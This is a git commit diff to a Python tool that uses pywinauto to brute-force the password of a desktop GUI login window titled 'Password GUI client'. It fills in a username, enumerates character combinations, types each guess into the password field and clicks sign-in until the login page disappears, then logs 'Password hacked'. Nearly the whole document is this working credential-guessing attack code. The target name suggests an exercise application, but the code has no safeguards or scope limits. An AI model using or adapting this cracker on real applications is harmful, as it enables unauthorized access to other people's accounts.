7effb486417b66c4e25696b38b0a3307de3afc2e
Qweyke <kettenkrad1337@yandex.ru>
2025-05-20 15:12:12 +0500

    feat: wianuto implement done

--- src/main.py
+++ src/main.py
@@ -1,11 +1,13 @@
 import time
 
-import pyautogui
-import pygetwindow
+from pywinauto import Application
 
 from custom_logger import dpi_logger
 
 MASK = 0x3F
+BACK_NEW = "uia"
+BACK_OLD = "win32"
+APP_TITLE = "Password GUI client"
 
 
 def build_alphabet(bitmask: int) -> str:
@@ -25,7 +27,16 @@ def build_alphabet(bitmask: int) -> str:
     return alphabet
 
 
-def hack_pass(start_pass_len=1, target_window_title=None):
+def hack_pass(start_pass_len=1, app_window=None):
+    password_field = app_window.child_window(
+        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.passLineEdit",
+        control_type="Edit"
+    )
+    sign_in_button = app_window.child_window(
+        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.regLogStackedWidget.logInPage.logInButton",
+        control_type="Button"
+    )
+
     alpha = build_alphabet(MASK)
     alpha_len = len(alpha)
 
@@ -35,24 +46,12 @@ def hack_pass(start_pass_len=1, target_window_title=None):
 
     start_time = time.time()
     while True:
-        try:
-            current_window = pygetwindow.getActiveWindow()
-            if current_window.title != target_window_title:
-                elapsed = time.time() - start_time
-                forged_pass = ''.join(alpha[index] for index in indexes_list)
-                avg = elapsed / attempts if attempts > 0 else 0
-                dpi_logger.info(
-                    f"Brute-force interrupted: Target window '{target_window_title}' is no longer active")
-                dpi_logger.info(f"Last tried password: {forged_pass}")
-                dpi_logger.info(f"Total attempts: {attempts}")
-                dpi_logger.info(f"Total time: {elapsed:.2f} s")
-                dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
-                return
-        except pygetwindow.PyGetWindowException:
+        if not app_window.exists():
             elapsed = time.time() - start_time
             forged_pass = ''.join(alpha[index] for index in indexes_list)
             avg = elapsed / attempts if attempts > 0 else 0
-            dpi_logger.info(f"Brute-force interrupted: Target window '{target_window_title}' was closed")
+
+            dpi_logger.info(f"Brute-force interrupted: Target window 'Password GUI client' was closed")
             dpi_logger.info(f"Last tried password: {forged_pass}")
             dpi_logger.info(f"Total attempts: {attempts}")
             dpi_logger.info(f"Total time: {elapsed:.2f} s")
@@ -65,7 +64,7 @@ def hack_pass(start_pass_len=1, target_window_title=None):
         dpi_logger.debug(f"[{attempts}] Trying: {forged_pass} | Elapsed: {elapsed:.2f}s")
 
         attempts += 1
-        if try_password(forged_pass):
+        if try_password(forged_pass, password_field, sign_in_button, app_window):
             elapsed = time.time() - start_time
             avg = elapsed / attempts
             dpi_logger.info(f"Password hacked: {forged_pass}")
@@ -74,69 +73,58 @@ def hack_pass(start_pass_len=1, target_window_title=None):
             dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
             return
 
-        # Iterate through each symbol of alphabet, until pass len limit
         curr_pos = pass_length - 1
         while curr_pos >= 0:
-            # If index represents last symb in alpha, then switch to next pos, else increment index on this pos
             if (indexes_list[curr_pos] + 1) < alpha_len:
                 indexes_list[curr_pos] += 1
                 break
             else:
                 indexes_list[curr_pos] = 0
                 curr_pos -= 1
-
-        # Increment password len and do again
         else:
             pass_length += 1
             indexes_list = [0] * pass_length
 
 
-def select_window():
-    dpi_logger.info("Select program window to capture")
-    time.sleep(5)
-    active_win = pygetwindow.getActiveWindow()
-    if active_win.title != "Password GUI client":
-        return None
+def try_password(password: str, pass_field, sign_button, main_win) -> bool:
+    pass_field.set_text(password)
+    sign_button.click()
+    time.sleep(0.1)
 
-    dpi_logger.info(f"Window captured: {active_win.title}")
-    return active_win.title
-
-
-def fill_login(login: str):
-    pyautogui.press('tab')
-
-    pyautogui.typewrite(login)
-    pyautogui.press('tab')
-
-
-def try_password(password: str) -> bool:
-    pyautogui.typewrite(password)
-    pyautogui.press('tab')
-    pyautogui.press('enter')
-
-    try:
-        location = pyautogui.locateOnScreen("log_out.png", confidence=0.7)
-        if location:
-            return True
-    except pyautogui.ImageNotFoundException:
-        pass
-
-    for _ in range(3):
-        pyautogui.press('tab')
+    login_page = main_win.child_window(
+        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage",
+        control_type="Group"
+    )
+    if not login_page.exists():
+        return True
 
     return False
 
 
 def start_brute(login):
-    title = select_window()
-
-    if title:
-        fill_login(login)
-        hack_pass(start_pass_len=2, target_window_title=title)
-
-    else:
-        dpi_logger.error("Wrong window selected")
+    # Connect to app window
+    try:
+        app = Application(backend=BACK_NEW).connect(title=APP_TITLE)
+    except Exception as e:
+        dpi_logger.error(f"Could not connect to window {APP_TITLE}: {e}")
         return
+
+    main_wnd = app.top_window()
+    dpi_logger.info(f"Window captured: {main_wnd.window_text()}")
+
+    try:
+        login_field = main_wnd.child_window(
+            auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.userNameLineEdit",
+            control_type="Edit"
+        )
+        if login_field.exists():
+            login_field.set_text(login)
+            time.sleep(0.01)
+
+        # Start brute
+        hack_pass(start_pass_len=2, app_window=main_wnd)
+    except Exception as e:
+        dpi_logger.warning(f"Error: {e}")
 
 
 if __name__ == "__main__":
